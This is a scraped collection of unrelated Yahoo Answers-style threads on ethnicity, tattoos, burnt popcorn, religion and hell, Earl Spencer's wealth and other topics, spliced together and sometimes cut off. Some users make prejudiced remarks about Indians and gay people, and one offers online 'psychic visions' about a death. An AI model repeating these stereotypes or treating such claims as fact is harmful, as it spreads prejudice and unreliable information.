I don't know what you are talking about but in my experience I have found that there are some hispanic people who are very light skinned. why would you treat them differently if they are hispanic or not?|`|tmFEFBQKaa	In this day and age, White is considered boring, whearas Hispanic is hot and spicy. This is why so many White girls get fake tans, they are trying to look Latina instead of like typical White chicks. And yes, it is mainly White GIRLS as opposed to guys who do this.  And yeah, it is very annoying. People should just be proud of who they are.  Anyhoo, that said, some White people actually ARE Hispanic, since it is a nationality and not a race. Latinos are stereotyped as having tan skin, wavy black hair and big, brown eyes, but that is not always the case.  But still, most White people who claim to be Hispanic are just trying to steal theit exotic lol.|`|87a27ae49a394a08586d96c719473f19aa	Your questions are always so stupid. But anyways, the Hispanic ''race'' is not a race at all. It's a group of people that are either White, Asian, or Black. People just don't seem to know that because of what they've told. So the Whitest looking person is identified as Hispanic because they come from a country in Latin America, but since Hispanic is not a race, in reality they are most likely White. Like, Dominicans are considered Hispanic, but in reality, again, they are most likely Black. Read a book once in a while, please.|`|xpiGWrdMaa	I have never seen this.|`|iWaU76T5aa	There are a lot of Spanish people who look White, like the guy who played Harry on Spider Man 3.

I got my first tattoo at 5 for my birthday, a small pentacle on my head, because I knew my hair would keep it hidden.  I have 6 typical biker tats from the 60s/70s.  A crescent Moon w/ 13 stars on my right upper arm.  The eye of Isis on my left upper left arm.  2 Ankhs , one on each ankle, these are symbols of everlasting life.  3 different tats symbolizing the Goddess Bastet(the cat of the temple/oracle, the name Bubastes in hieroglyphics, and my original design of how I perceive the Goddess looks to me.)  I also have the numbers 666 tattooed next to a scar on the back of my head, but it looks more like the symbol for a hurricane with an extra curve. I had it done right after I survived a motorcycle wreck, (the vehicle that hit me was driven by a Baptist Minister, who had a blood alcohol  level beyond 1.2). I made a promise to myself, if I survived the wreck, I would add this to my tats next to the worst injury. I had 123 stitches in my head & wasn't expected to survive. I also have a metal plate holding my skull together from that incident.    EDIT:  I'm 60, and for quality information, Tattoos done by a silled and Professional Artist do not fade . Now granted if you lose or gain  weight your tats will change. But they won't fade if they were done correctly.  My oldest tattoo will be 55 on my birthday in November of this year. And it is still there and looks just as clear as the day it was done.|`|eb71d539c6860290e80bdaa4253a2f87aa	No, but I do have a turtle shaped scar under my arm from a skin biopsy that had the stitches taken out too soon.|`|5ee0364dd7d0159e953e987902e16956aa	Have you got a Rose of Jericho?

I said it was the day she was born.  We never agree.|`|28216207e17752f6c782dd9a28e07f1faa	I've seen here around. I still find her entertaining, if disturbing.      Has anyone stopped to think she might be just pulling our collective legs for a giggle? No one could be that obtuse... could they?|`|QmGfU3Bxaa	Yes, and shes in Bed with me "Cooking" something up.|`|xRCynGQqaa	Yep, she's back.    But Jill seems to have disappeared.......coincidence?|`|WjRqYf6naa	I see her almost every day. She's priceless.|`|a7fd823ff38cea82d01dbcb747972460aa	I saw her a couple of days ago|`|zMcHYQeBaa	She must be on vacation|`|rGEZup0Zaa	Yes, she was on today.
N26qrTd3aa	Is that a show or something? I've never heard of it!|`|E5iFR6BJaa	Hmm..I'm fine to be in the real world. But isn't it kinda useless, cause.....it's not showing in my country anyway!|`|Dkylapi6aa	I don't know because some seasons of RW are really pointless, like RW Hollywood. They were buncha freakos that didn't learn ****. I like the current season because there is a lot of learning for these people. YEah it basically depends on the cast dynamics.|`|81zYAFphaa	It seems that all they do is go clubbing, drink, and hook up-- so yeah, I'd be in it.|`|a1iam8Zvaa	i would say okay  because i would want to be on tv and in a nice house in some nice place :D|`|J1XwqvLGaa	Sure, it's an experience I want to take part in. I'd be running alongside you. Ha! :3    I meant, helll yes!!!|`|3ee9a82552425841f1df0a2f7477f624aa	I guess so... depends on the location.|`|6SwaWSoyaa	I would love to be on the real world. I think it would be fun to make a family out of a random group of people all around america that you didn't know. plus it is always to know you will have friends anywhere you go if the cast is from places widespread all around america.
GPCzENwCaa	I am new at online visions but here is my best shot. A gun shot blast from a silenced gun. Shot once in the chest or arm area and also maybe in the head. Wearing a dark shadowy clothing and there may have been two killers. They had something against him involving a bad run-in a few weeks back. Which points to being a hit-man or a payed individual. And then took him to the shed to destroy any evidence. He and is helper ran out to a low-riding car I believe black and drove off.    Note this was very blurry because it is hard to connect over the internet. Hope you find the truth.    Good luck|`|jard50Yiaa	Have you spoken to the police?|`|o1yy6KABaa	I dont beleive there was anyone else involved, I believe he may have taken his own life.|`|aZKgs79Naa	I have a feeling he was shot.      I hope I've helped you...|`|8k6kxOh2aa	when i think of this, the only image i can get is of a figure all dressed in black. the background is really blurry. it looks like in a big town or city...that's all i can get. sorry. this is a relatively new abilitys i'm experimenting with. i get gun in my vision as well. i agree. i think he was shot.  i usually don't answer questions asking for psychics, but yours is actually something important.  ~stardriven09
acaJSqW6aa	Yes....then I try to pick out the not so burnt....cheap aren't I?|`|niLvdq0Qaa	I accidentally put the timer on for 5 minutes and went outside to do some gardening and the whole micro caught fire and so did the bag of popcorn--The smoke detectors in the house went off and I had to purchase a new micro. Imagine that one!!|`|S2FhDtfSaa	So many times, the wife forbids my cooking it.|`|XEbrGfZuaa	I'd assume everyone had, at one time or another. I have many times  with different microwaves. And I have eaten it if it wasn't too badly  scorched. It's usually when I get down to the last package in the  box, that it might scorch sooner than it should. So I suffer in silence  and eat some of it anyway.|`|kYYHw7xEaa	Don't even mention popcorn to me.  Burned? no.  Not cooked enough? yes  A few days ago I bit down on an unpopped kernel, and broke a back tooth. Things are wearing out.|`|7xGtL1vxaa	Yes and you talk about stink.|`|vkETbqRmaa	yes and it sucks really bad especially when  it was the last bag of pop corn and you're about to watch an amazing movie|`|X3Lp0ewMaa	Yes I have and it makes the microwave stink|`|iNkOiNC7aa	Yes! then i cook an orange or lemon to get rid of the smell..|`|cb3eb62547cb6c9331eff7e93098582daa	several times.  it smells okay, but it tastes disgusting!|`|RWgjnwl9aa	Yes & Phew it stinks the whole house up  so what I did was pour lemon juice in a bowl & heated it in micro  it took a couple of times & then I could wipe out micro  even my 2 dogs  ran out of kitchen  it was like every man for himself  ha ha|`|mJZnxlVMaa	Oh, yea.  And you can't keep it a secret 'cause everyone in the house smells it and lets you know!|`|ok6EGPnpaa	Oh yeah, and doesn't it stink something awful?? Even worse than on     the stove in my opinion. Probably because of the flavoring they add.|`|AA11722373	Yep I have done that a few times. My boss for some reason or another manages to burn a bag of it at work every day. You would think after awhile that she would learn how to do it. The warehouse that we work in is huge and it sure stinks up the whole building. As soon as someone smells it they yell out that Patty has burnt her popcorn again.|`|gCAJaFnyaa	More than I care to remember.  The newer microwaves have a popcorn button to use.  I do a little bit better using it.  I agree with the others about the smell. Ohhhh Noooo!|`|2liwk8yKaa	Yes now I cook at half the time suggested.|`|4cd2c7649e1949de04b5f7bdd1c51814aa	Only once & it smelled so bad inside the microwave for a long time. I used some cleaners on the inside to try & get rid of the odor but it just wore off in time.|`|vNtgnag5aa	I did it when I was 12 and actually caught the popcorn and the mircowave on fire while I was home alone. The smell of fire and burned popcorn is horrible.|`|nXSpS3Axaa	Yes, but it's usually in between being perfectly cooked and burnt.. in other words, it loses its flavor and a small amount of it is burnt..|`|GdvzZRFMaa	Oh yes, it is awful, then trying to get the smell out, it is almost impossible.|`|llgBLR6daa	yes! it smells awful, and it always seems to be the last bag!|`|XWk7TDYTaa	my sister made all the cabnets around the microwave black|`|54d31d8ca1d93393903fc5f7a7334431aa	Yes. It smells like death.
3GAiVmEAaa	Marrying a woman would be a lie and unfair to both people.    If he finds someone he loves then he can continue just like any other relationship, expect he may have to wait a bit before getting married.    If he wants to live alone, then it is fine just like any straight adult.|`|3ibsZ4mTaa	Gay men should live their lives freely.|`|5tMCDu8gaa	Uh, no. Dying alone and pretending to be straight are not the only options. There is a third option, which is find a partner and tell homophobic idiots to get lost.|`|AA11595906	neither.  No one should live alone, unless that's what he chooses|`|Px8urrAuaa	Uhm?  Why should anyone live alone, unless it's their choice?    You're saying that a gay man should not do what makes him happy, but rather do what makes some imaginary being in the clouds happy?  That's BS.    How would YOU feel about that if YOU were gay?  Ignorance.|`|db7df25ea31227e5641d5c32d43c3bcdaa	the best option is to be saved and have God change a person by his holy spirit.|`|Pq8IW1ziaa	is this a question for us? or the Pastor. Or Priest.  Or Counselor.     If it's spiritual guidance...don't ask me to define your moral  barometer. I'm not God.|`|kXhAERt3aa	No.  You see, now you are not asking 'spiritually speaking.'  So in reality, since 15% of humans, born to straight couples, turn out to be gay or lesbian, it has to be part of God's plan - right?  So no matter what homophobia people have infected the Bible with, God makes people gay - so there is a purpose there.  And thinking that God just wants to make 15% of the population suffer by making them gay or lesbian from birth but telling people that it is wrong is just not sensible - not compared to the thought that Gods word was received and interpreted by flawed humans who were not only homophobic, but also misogynists.  So the parts about gays being wrong and women being unordinate?  Added by the hand of man.  God has made a world in which finding someone to love is hard enough - making it impossible for 15% of mankind is just unthinkable.  So - do not live alone, pick a partner.|`|TyRfv0eoaa	He certainly shouldn't try to marry a woman. And he cannot "change," he can only pretend to be something he is not. So-called ex-gay ministries are a sham, and produce only depression, self-loathing and often suicide.    As for celibacy, that's entirely up to him. Most people aren't cut out for it. And if he isn't, he should find a good man and get married to him.
EtMW3RY0aa	"negative. it gave me false hope and fear"|`|8c0d15366f972f0fe93e20c73c8bda50aa	As odd as it was, while a child, I was more fearful of god than satan. Hehe. I understood satan, as I grew up, as nothing more than the "shadow" self of every human and that god was like the "lighter" self. It's something I've actually accepted and believe in - we have a god side and a satan side, but many will say they don't have satan inside them. Bah!|`|UD7d70awaa	I grew up without God. Sad childhood.|`|oFSWpOjCaa	absolutely negative, especially the way it was in my house. "sinner" "whore" and "fallen from grace" were just the nicest of what was said to disobedient children.|`|HJEQv3cBaa	I like your answer Mrs.Lady God is LOVE and it was nothing but positive in my childhood. Lets not forget he is the one who gave us life in the first place. He also gave us a passageway to earn eternal life through his word, kinda think about it he gives us EVERYTHING. When in fact he doesn't really owe us nothing.|`|NAL9SZuXaa	About just as much as multiplication and reading...helpful, but not my whole life.    But it varies from person to person|`|nw0fqXj9aa	The idea of god and satan were just like having another set of parents, but invisible.|`|sitkfn5Maa	neither..|`|jg5Ii27Vaa	very positive because my parents instilled love, faith and peace. they never told me "you're going to hell if you do this...". they never once told me that. my parents lead by example.|`|0c4355b7a54face4e0c4291ab022d9f3aa	I was raised as a reform Jew. Satan was not really mentioned, and the idea of God had negligible influence on me as a child.|`|KH8JAV6qaa	In all honesty, very negative. My mom was never super-christian, she didn't even go to church, but my grandma did. And although she didn't outright threaten me with hell, she told me bad people go there. So, from the age of about 8 I started to become fearful of death, and that is most likely why. But around age 12 I started thinking for myself, thank goodness.
bdade993e630dbc15f1df344277bad03aa	haha. I get ur confusion. In india, its ok to put your arm around your best friend in public, but a taboo to hold hands/ put your arm around your own wife. They probably are used to their older ways.|`|x66TTEymaa	that is kind of a racist question  americans are strange to you know|`|TZCzjpGmaa	it is because we are indian......many colours, customs, traditions are in  the inherent structure in india......and that makes us stand above all in the world.....    I believe you belong to china(communist).....where people are not allowed to dress according to their choices...lol|`|eFPnPZXIaa	The hell? The world is full of culture. American culture is strange to them, i'm sure. And you may see a lot of foreigners dressings flamboyantly because the American dollar is worth a ton more than their currency, so they're able to make money here, and shop extravagantly over there. That's also why you see so many Israelis and Indians working in malls.|`|Ap1NRv6daa	Yup, your right. These Indians are surely more illiterate then we can ever think of. As everyone always says, Illiteracy is the reason of India's poverty and backwardness. If those men who wear ridiculously designed bell bottom jeans and behave like idiots and all that, then they should be literate. Really. Especially, Kannada people. They act so arrogant and this is why there are so many traffic jams and accidents in India. This illiteracy is also why there are beggars on the roads.|`|Obbg9t03aa	when i visited a theme park in USA women were wearing bra and almost thongs like shorts when there was no beach nor water pool for miles and miles makes me question why the hell straight women dress and behave like that ? Is it because it is USA ?    If a woman sports a bra or a man shirtless in Middle eastern country in a shopping mall the person would be flogged in public no questions asked.    So each geographic location has its own cultural influences and their own dress sense. So please learn to respect it.|`|UetO2I77aa	sir,    India is a great place with absolute freedom of speech, religion and culture. we have very high level of tolerance and are allowed to take any kind of criticism. we have the greatest achievement of having had people like Budhdha,Gandhi , Vikram Sarabhai, Ramanujam...etc who have contributed positively. Please be kind in your words when you criticise us|`|hU9AZhS2aa	Are you strange?? Each country has its culture, religion, clothing, livelihood, and so on. We can find others' cultures strange but at the same time, others might find our culture strange. But we are all humans, and we have to support each other. Please express respect to others while talking on such issues.....Whew! Now I know how wars begin...|`|92iuiuZKaa	Huh? wtf are u talkin bout?|`|gG9KjYRfaa	I could say the same about you.|`|us1ca2qIaa	Most likely, they are not at all straight. They are curving circles.|`|da4zS4AOaa	Wow this section has been about blacks and whites and asians. NOW Indians....I wonder where this will go.    You need to study Anthropology and respect other people's cultures. Don't judge them using the views of your culture. That's what i've learned in college|`|UspK4SQBaa	Strangely enough, they may consider you just as strange.  All cultures are strange because they're different.  You can't expect everyone to be a carbon copy of you.  That would be boring-and scary.  Ever seen "The Stepford Wives"?|`|LhCGU3F1aa	So I'm strange? Even though you said most, I'm assuming you probably meant all, but tryed to hide it. I think you've been watching to much Bollywood films. Those directors and actors get me mad, they think that's how we live in America and Canada, when its not even close. The girls dress like sluts, which is funny, because for 4 months in Canada, if you go outside dressed like that, you`ll die of frostbites ha ha. They need to do their research before they go making these stupid movies.  This bugs you so much why? I'd understand if you were learning more about India, but why do you care so much? Imagine a Indian asking why you guys are always drinking beers and eating chicken wings? Makes no sense right, every country has its own cultures hunny.|`|8I4QY6osaa	why is your avatar wearing a viking hat?  this question needs to be deleted.|`|j0zDQQG2aa	What hell are you talking about?|`|Jd7SnU4Vaa	how do you know they were straight?|`|e3c2ed462851c4c6d6796055b93e6970aa	Different culture different behavior... and you might be on the pansy side of town. AIDS is a big problem because poor guys will prostitute themselves out for extra cash. There's a demand for gay prostitutes.|`|VKDLSPFAaa	no! that has nothing to do with that!   oh my gosh i cant believe there is such ridicule and racism in this world today!  your question disgusts me!|`|tNQIE29raa	what to u think of india...we are not so strange than ur avatar.look this is the first and last time we excuse u...or else ur account will be suspended the next time.u make even a good girl feel angry by this cause we have patriotism.i'm sorry for that warning but pls don't repeat it.or else the warning will become true.|`|MPtt9wPjaa	don't feel attacked when i say this but    i find it strange that two people (even if they are both men) holding hands and wearing colorful clothes makes you wonder  but not the fact that kids are growing up and leaving their parents abandoned, or couples getting divorces, and children getting abused. don't you think those are more important questions?  the closeness of two people makes you wonder, but the rift between so many is normal?|`|FpT7x2VVaa	you really just need to educate yourself quite a bit more! what's "strange" to you, is perfectly normal someplace else.    do you realize, that to most Japanese for example, Caucasians smell bad. get that through your head.........|`|iHMu4Jtoaa	Where do you live? I have never seen this!|`|jylgnn64aa	What does this have to do with Indians??

366aa3bbb60558f11aecb9d3750bceb2aa	Does he have one of those listening devices that you can order off of tv?    My daughters have this same problem, there is this creepy guy at their college that asks one of my daughters for her number all the time and is always doing stuff to make her notice him.     I think your creepy guy is a stalkerish type person.
0QGuWHRsaa	The defination of Grobanitis according to http://www.ourjosh.com/the-fans/glossary...    "Grobanitis: A contagious infection::  -that causes one to continuously play Josh Groban's cd...  -that causes you to look around whenever the name "Josh" is spoken...  -that makes you look twice whenever you see a man with curly brown hair...  -that makes you check his website several times a day waiting for the "SURPRISE" to appear.....  -that causes you to check ebay everyday...just in case...  -that spreads wildly among fans, young and old...LOOKOUT!!!"    Yeah, I definatly have it too.... I was watched "Get Smart" the other day, and in the part where they are all running into the concert hall, and there's a guy in line in the background with brown curly hair and it sorta looked like Josh Groban, so I paused the movie to see if it was actually him, but it wasn't. :(    I haven't been able to find the entire 'Ally McBeal' episodes that he was on.... I really want to see it too! I've considered buying both of the seasons, but I'd rather not because I only want to see two episodes. I'll let you know if I find it anywhere. If you find it, let me know!

The same pattern occurs when you look at countries throughout the world. The less money/education they have, the higher their rates of religious people.

It is also a matter of human nature.

I have however, met some of the sweetest and kindest that do not fall in that category. But, In the north, I tended to see religious people living the teachings of christ on a day to day basis, in love, respect, doing good.. turning away from sin... with less emphasis on themselves or wearing the "outward" badge.  This is just a general trend.. I have seen.      The bible does however teach about people who claim to know him, but disobey the teachings.. in daily life..      EXAMPLES... hypocrasy in the churches    1 Corinthians 7:10To the married I give this command (not I, but the Lord): A wife must not separate from her husband. 11But if she does, she must remain unmarried or else be reconciled to her husband.     John 2:4 The man who says, "I know him," but does not do what he commands is a liar, and the truth is not in him.    Examples Luke 16:18 "Anyone who divorces his wife and marries another woman commits adultery, and the man who marries a divorced woman commits adultery."    Mark 10:19 'Do not murder, do not commit adultery, do not steal, do not give false testimony, do not defraud, honor your father and mother.' "    1 Corinthians  9Do you not know that the wicked will not inherit the kingdom of God? Do not be deceived: Neither the sexually immoral nor idolaters nor adulterers nor male prostitutes nor homosexual offenders 10nor thieves nor the greedy nor drunkards nor slanderers nor swindlers will inherit the kingdom of God.    Romans 2:13 For it is not those who hear the law who are righteous in God's sight, but it is those who obey the law who will be declared righteous.    There are few flock that follow the true word of god, but they are there... always amongst the others - like grass amongst the weeds - these are the pure.. never willing to compromise jesus for any false worldy gain.|`|nIu8zVkXaa	I'm not at all surprised although I don't know why that is.

How can you claim to know what exists outside of our 3D space-time existence? This entire claim is based on speculation.

Do you understand what I'm saying?|`|suEP8YkFaa	By definition, time is that dimension in which cause and effect phenomena take place. If time's beginning is concurrent with the beginning of the universe, as the space-time theorem says, then the cause of the universe must be some entity operating in a time dimension completely independent of and pre-existent to the time dimension of the cosmos. This conclusion is powerfully important to our understanding of who God is and who or what God is not. It tells us that the creator is transcendent, operating beyond the dimensional limits of the universe. It tells us that God is not the universe itself, nor is God contained within the universe.    This means, it is beyond our scope of understanding, science, any human.|`|AA10530949	To say that God existed "before time" is fallacy because the word "before" implies a sense of time that was not present "before time".  God created all things, and physics tells us that our universe is woven out of the fabric of SPACE-TIME... time is very much a component of space, so for God to create space, he must have created time as well.      Really, you're reading too far into this.  You can't ask about "before creation" because there was no time, there was just God.  Theists only use the "outside of time" argument to explain how God can be both omnipotent and humans can have free will at the same time.|`|u6K5TtRlaa	As interesting as that argument is, the fundamental flaw is that humans don't have any experience or laws of physics that hold up outside the boundaries of space-time. I don't think that humans have the capacity to understand (define, maybe, and explain, but never understand) any kind of existence beyond the rules we set up. We can create an ant farm, a colony of powerful, organized insects within the dimensions of their thin glass case, but the world they know would only be vertical and horizontal. They might wonder at what it'd be like to create the vertical and the horizontal before either one existed, but couldn't comprehend, from their admittedly confined perspective and capacity of reason, the concept of a width to the universe.    Don't misunderstand me: I'm not saying that you're wrong, I'm just thinking that there's no way to ever confirm that you're right.    Of course, I'm a pessimistic agnostic who doesn't believe that omnipotency and omnibenevolence come together. I'm inclined to believe your point, but I just don't think this argument can hold up.|`|AnapXXf7aa	Apart from pure theory based on the assumption of the existence of time, what evidence is there even for the existence of time?    Where does it exist? As far as all experience so far goes, even scientifically, all there is is now, past and future are in the brain in the form of images - they do not exist.     Time is the feeling of relativity that all matter experiences as a measure of physical change occurring around itself. There is no evidence that it is a dimension in itself - it is purely our creation.    All there is is space, movement in space, changes in space. There is no time. Space is emptiness. Matter needed to be created at some time, but the space in which it exists does not follow the same laws..for there is nothing there. Start and finish do not apply to the immaterial.     From a cosmotheistic perspective, "god" is the all permeating divinity, nothingness, emptiness. From this perspective, "god" is timeless, spaceless, has no beginning, has no end.|`|ppKsmaEIaa	God created time, yes. But He also created humans to be confined by time. He created you to ask this question at this specific time. He created earth some amount of time before today. But what is this time? It's something we have always known of, something we have always lived according to. So where did it some from? It couldn't have come from itself (according to your logic, that would be absurd). It couldn't have come from something that was restricted by it either (can a man constricted by a glass box create a glass box larger than the one he is in? No, if he can't get out of the original glass box, and nothing we have ever seen has gotten out of time). So, according to your logic, time must have been created by a God. A being outside of time with infinite power must have created time. The only option is God.    Also, you are trying to define God according to your definition of human. You are trying to define God in human terms, "restricted" by human qualities, which, in my belief, is not the case. God is infinitely more powerful, infinitely more brilliant than every human being that ever lived...ever. God is not human, God is God. God created us, we cannot hope to try to create Him how we want. This has to be true if He is God, superior to man.    Logic does not restrict God, He created that also.|`|aIbcPSYiaa	For as the heavens are higher than the earth, so my ways are higher than YOUR ways, and my thoughts than YOUR thoughts. {Isaiah 55:9}    Get behind me, Satan!

You are reasoning away time and attempting to make time applicable to God thus, in effect, this line of reasoning would do away with God by making Him like us.
ixFbNr4taa	Net worth -- could not find much that was truly authoritative but......here's a snippet    The earl takes an equally modern--and practical--approach to his noble heritage. He's worth more than $100 million, but most of the fortune is tied up in land and antiques. He needs cash flow to maintain his 121-room mansion and 13,000-acre estate, and he's been savvy about finding it. A few years ago, he raised $336,000 by auctioning four of his lesser titles, including Lord of Wimbledon. The titles were purely symbolic--they carry no land and no seat in the House of Lords--but the sale nonetheless horrified traditionalists. He has hocked heirlooms to pay taxes, rented his mansion out for conferences and banquets, proposed turning 500 wooded acres of his estate into a housing development, and leased the grounds for concerts.    http://slate.msn.com/id/1831/    Family History:  Earl Spencer is a title in the Peerage of Great Britain that was created on 1 November 1765, along with the title Viscount Althorp, of Althorp in the County of Northamptonshire, for John Spencer, 1st Viscount Spencer, a great-grandson of the 1st Duke of Marlborough. He had been created Viscount Spencer, of Althorp in the County of Northamptonshire and Baron Spencer of Althorp, of Althorp in the County of Northamptonshire, on 3 April 1761.    The courtesy title of the eldest son and heir of the Earl Spencer is Viscount Althorp.    The family seat is Althorp in Northamptonshire.  Althorp House,is a wonderful mansion house set in extensive grounds that are the very essence of typical English countryside. Althorp House has been home to the Spencer family for 500 years. In 1508 Sir John Spencer acquired a 300-acre estate and his grandson made it the principal Spencer family home.     From the Spenser's own website......  The Spencers have been farmers since pre-Tudor times, coming to prominence in Warwickshire in the fifteenth century. John Spencer became feoffee of Wormleighton in 1469, and a tenant at Althorp in 1486. His nephew another John, through trade in livestock and commodities, then bought both properties outright, was knighted, and so lay the bedrock for the family's fortune. His descendants expanded the holdings through business dealings and marriage into the peerage. However, not until Robert, First Lord Spencer (1570-1627) does a fully-rounded character emerge from history. Thanks in part to the steady accumulation of his forebears he became one of the richest men in the land. He owned almost 20,000 sheep, and with sales of meat, breeding stock and wool, his income was about 8,000 per annum. As a man of standing, he met James I as the royal court travelled down from Scotland in 1603, accompanying it on to London.     Meanwhile James' wife was entertained at Althorp, then a secondary residence, with a masque by Ben Jonson. Robert was soon ennobled; and like many Spencers afterwards, almost in spite of himself he suddenly found himself in public service. King James I sent him as ambassador to Wurtemburg to present Duke Frederick with the Order of the Garter. Although his skill in antiquities, arms and alliances was singular, Robert appears to have found the expedition more chore than cultural enrichment. Though politically active he soon fades from view.   More information is on the site    The family estate includes significant land holdings in other parts of the country, including the village of North Creake in Norfolk.    Of course - Diana, Princess of Wales, was the youngest daughter of the 8th Earl Spencer.|`|bda465ikaa	Here is the blurb in the Sunday Times "Rich List" and the results for The Queen for comparison. Both the Earl of Spencer and the Queen have the same net worth that they did last year, but both of them have slipped in ranking as other people have gotten richer.    ================  RESULTS FOR 2008  Ranking: 723  Worth: 111m  Source of wealth: Land    Spencer, 43, has a controversial 40m plan dubbed Dianaville by locals to build 2,500 homes near his sister Princess Dianas grave at Althorp. His father, who died in 1992, left 88m in his will, but much of that was tied up in the 8,500-acre Althorp estate and its art treasures. There is other wealth.    RESULTS FOR 2007  Ranking: 625=  Worth: 111m  Source of wealth: Land     =========================  RESULTS FOR 2008  Ranking: 264  Worth: 320m  Source of wealth: Head of state    The Queen knows, like the rest of the country, what stock market turmoil can do to ones assets. Her personal investment portfolio is down about 20m to 100m this year, and a lavish diamond anniversary party at the Ritz for her and the Duke of Edinburgh was cancelled because she felt it would be inappropriate at a time of economic uncertainty. In the first Rich List in 1989, the Queen was No 1 at 5.2 billion. That value included the royal art collection, which it is now accepted she looks after on behalf of the nation. Her personal fortune lags far behind that of her son, according to the property magazine Estates Gazette, which valued the Prince of Wales at 608m. As with the Queen and the royal collection, however, he is only steward of the Duchy of Cornwall and its vast land holdings, so there is no place for him in our Rich List. Rising land and stately home prices have added 20m to the Queens personal property portfolio this year, including Balmoral and smaller houses, taking this element of her wealth to 120m. Her personal art is valued at 2m, in contrast to the royal collection which is worth about 10 billion. Adding jewels, the royal stamp collection, horses and the Queen Mothers legacy keeps the Queen at 320m. Things would, perhaps, have been different if George III had not surrendered control of the crown estate in 1760. It is worth more than 7 billion and made more than 200m profit in 2006-07 for the Treasury. The Queen, in turn, cost taxpayers 37.3m, 0.03% down on the previous year.     RESULTS FOR 2007  Ranking: 229=  Worth: 320m  Source of wealth: Head of state

You seem like a really cool guy (random I know, but I'm not being sarcastic)    I have a scar on my lip. It's actually a skin graft. Two years ago I was playing with my dog Floppy and my sister was hugging him. I was about 1 metre on the ground near Floppy and he attacked me out of nowhere. He tore all the layers of skin off my lip and I had surgery the next day. (It happend at 6 or so at night and I had surgery at 7am in the morning.) A fer days after we had to put our dog down.    I spent 2 days at hospital and went through a long emotion journey after that.. The memories of me getting attacked and the fact I looked different hurt me. I carried that around for about a year and a half and even hated my appearance at first and was embraced to go out. Two weeks after my surgery, I still had this ugly thing they called a wad sewed on my lip and this idiot kid pointed and me in front of the shops and said to him Mum "look at that girls lip!" I also got a comment at school which hurt at the time. I was getting books out of my locker and this guy from a few years above me said "cut yourself shaving?" cause I had to wear a band aid type thing over my skin graft for a year or so after. I had the biggest go at him ever lol! Now I feel so much happier and like my lip. I look like a normal person and you can hardly notice it. The story sounds kinda weak but if you think it's not that bad I can show you some pics from after the surgery. It's crazy.    I really like my hair too.. it's wicked :D  And my stomach.

rBCQBHSHaa	That is free will, you chose to go against the rules. You suffer the consequences of your decisions.    A Loving God doesn't want to send anyone to hell, he would love for everyone to believe Jesus died for their sins, and for them to be good people. That obviously doesn't happen, some people use their free will to live life the way they think they should, and they suffer for it.|`|TKZAYJokaa	i dont believe in the hell most people do. although ive read many nde so i kinda think, if after death we suffer a hell like experience its because we ourselves think it, and make it so.|`|IbtQ5IKNaa	You send yourself there. Go smack yourself!|`|UrNMuhFKaa	There is the crux - The rules are not what it's about. No one lives that pure. It is about the choice to be with God or not be with God.   Think of the eternal suffering as an eternity with not having any of God.  The scripture says all good things come from God. Imagine an eternity with no good. God wants relationship and everyone one earth expericences to some degree God. He asks you to choose Him. He does not force you. He just says if you don't want me then you don't have to have me. Hell will be a place where God will not be or any of his attributes. No love, no joy, no peace, no gentleness, no goodness, no kindness, no relationships.  If you are really searching - there are better places then this.|`|KvwVBzb0aa	There is no hell. There is a God and he gives you many tries to get it right to be with him. When you die you are given a choice to either come back to earth if there is more you would like to learn, and you may be accepted to be with God if you so chose or he can send you back to get things right if you have not walked with in the laws of God while on earth. If your body is shot and you have been sent back many times and are just evil and do not even try to be a good and just human you can be banished from God by God and this is kinda where the Hell thing came about. But the fire and brimstone banishment to hell is just a scare tactic used by the originators of Christianity. Christianity is one of the only religions that does not believe in reincarnation. But speaking to the question of suffering eternally yes this can happen but not by the way they describe hell as. If you do not live your life by his rules you could be destined to live one bad life after another forever and again Christians do have a good basis for a righteous living but it does not have to be that stringent. You just have to treat people as you wish to be treated and harm no one (mentally or physically) and you will get to be with God.|`|EtMW3RY0aa	"Christians are going to say that god gave us free will here on earth and we choose to sin and not believe, so we are sending ourselves to hell, not god....b.s"|`|6QJifcvEaa	i agree he give us free will but wait there's strings attached, He should just give it or not give it at all.

There isn't hell.|`|71jwh2xSaa	God doesn't send any one to hell. We make our own choice, He sent His Son to pay our sin debt , it's up to us to accept HIM or reject Him !! If we reject HIm we are sending ourselves to Hell. Just like breaking the law. If you break the law you go to jail, if you follow the law you get to enjoy freedom.  Jesus is My Savior!!    If you love your parents you do things pleasing to them, you want them to be proud of you, same as with our heavenly Father.It seems much harder to understand with a closed mind than it really is. The devil will decieve you. You see when you decide to accept Christ as your Savior, the Holy Spirit comes to live within you and it immediately changes the way you look at things. The heart that once was hardened becomes soft. You will want to follow Gods rules. You know the old saying don't knock it till you have tried it.... That definitely apllies with God. Once you have opened your heart and recieved His Spirit you will understand. I can do anything I want to do because what I want to do is live a life pleasing to God.

Just like if you picked up a poisonus spider, what do you think will happen? Maybe get bit but hey you made the choice to do so. I guess all I can say is I am sorry you had to be born and make choices- simply put, that is life, it's never sugar coated...one thing to swallow first. And second...God loves you through it all, even if you question the ways that were set forth ya know. I am sorry if you want to be a bad person, that is where you will be. I know it is sometimes hard to be perfect, but at the same time your heart, just like everyone elses was pure and innocent' sounds like a sunday school special but it is true. Look at a new baby, yeah he cries and poops but look at him- never hurt a soul, never knew bad. Just precious, and at one time that was you too. He just gives you free will, to choose what you want from life, to be good or bad. If you believe in him, and just do what is right from your heart, you don;t need to worry. Not too difficult really I think some people just make it out to be very strick at times but just know your heart and know him and you don't need to question anything! If you choose to question the bad always have room to question the good as well.|`|GiBEGUTIaa	First all,Mr.Wicked Young Man  Your name says is all..  The World is a Wick and Evil Place...  God does not send people to Hell.. People disobediences send them to Hell...  It says in the Bible...That's Greater is He that is within you than he that is in the World...  Which basically means God has been with you and He has loved you before you were even born..But you are the one who turned your back on God...  God is a very loving and He is waiting for you with open arms..All you have to do is chose Him...  Read this story and decide for yourself...  The shadow of the cross that was raised on Golgotha reaches across the centuries to offer comfort, forgiveness, and hope to us today. The story is almost unbelievable, for it is hard for us to image such love. "God so loved the world that He gave His only begotten Son" is the message of the golden text of the Bible, John Chapter 3, verse 16. Jesus had to love us beyond measure to give Himself willingly to die for our sins. And we must complete the story of love by loving Him in return.       Some of the Jewish leaders hated Jesus because He condemned their sins. They did not want to believe the truth He preached, as He urged them to repent and turn back to God. They became jealous of the great crowds that followed Him and believed in Him, and finally decided to get rid of Him by having Him killed.     Since the Jews did not have the right to have a man killed without the approval of the Roman governor, they had to take Jesus to Pilate. At the trial they had no evidence of wrong-doing by Jesus, but put enough pressure on Pilate that he finally agreed to have the soldiers kill Jesus by crucifying Him.     The place where they killed prisoners was outside the city of Jerusalem on a small hill called Golgotha or the place of the skull. Here they laid the 